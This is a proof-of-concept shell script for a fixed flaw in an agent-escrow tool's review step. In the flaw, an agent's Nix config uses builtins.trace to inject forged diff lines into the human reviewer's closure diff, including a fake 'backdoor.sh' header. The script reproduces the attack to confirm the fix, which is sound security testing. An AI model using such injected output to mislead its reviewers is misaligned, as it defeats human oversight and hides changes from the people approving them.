#!/bin/sh
# FIXED on closure-indent (print_escaped prefixes every line of nix's errors).
# PoC: forge diff lines in `review --closures`. The agent's own Nix code runs
# at review time (nix eval of the proposed config); builtins.trace prints its
# message at column 0 of nix's stderr, which escrow showed after "closure
# diff:". A reviewer saw extra "M"/"A" file headers and "+" lines that apply
# would never write.
# Usage: closure-trace-forge.sh <escrow> <role-demo>   (from the repo root)
set -eu
E=$1 ROLE=$2
d=$(mktemp -d)
cp -r demo/ops "$d/ops" && chmod -R u+w "$d/ops"
ssh-keygen -q -t ed25519 -N '' -C alice -f "$d/alice"
echo "alice requester,reviewer $(cut -d' ' -f1,2 "$d/alice.pub")" >"$d/roles"
export ESCROW_ROLES="$d/roles" ESCROW_STATE="$d/state"
"$E" --role "$ROLE" --key "$d/alice" --workspace "$d/ops" -- bash -c "$(cat <<'EOF'
cat > ops-svc.nix <<'NIX'
{ ... }: builtins.trace "\nM keys/api.key file mode 0600 -> 0600\n+FORGED-LINE\nA backdoor.sh file mode 0755" (throw "boom")
NIX
EOF
)" 2>/dev/null
id=$(ls "$d/state/runs")
"$E" review "$id" --closures | sed -n '/closure diff/,$p' | head -6
# vulnerable: "+FORGED-LINE" at column 0; fixed: "  | +FORGED-LINE"
echo "state in $d"
